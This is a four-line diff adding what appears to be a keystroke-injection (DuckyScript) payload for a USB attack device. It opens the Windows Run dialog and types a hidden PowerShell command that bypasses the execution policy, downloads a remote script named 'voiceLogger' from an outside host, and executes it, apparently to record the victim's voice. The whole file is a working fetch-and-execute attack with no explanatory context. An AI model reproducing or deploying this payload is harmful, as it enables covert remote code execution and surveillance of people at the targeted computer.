@@ -1,0 +1,4 @@
+GUI r
+DELAY 1000
+powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
+ENTER
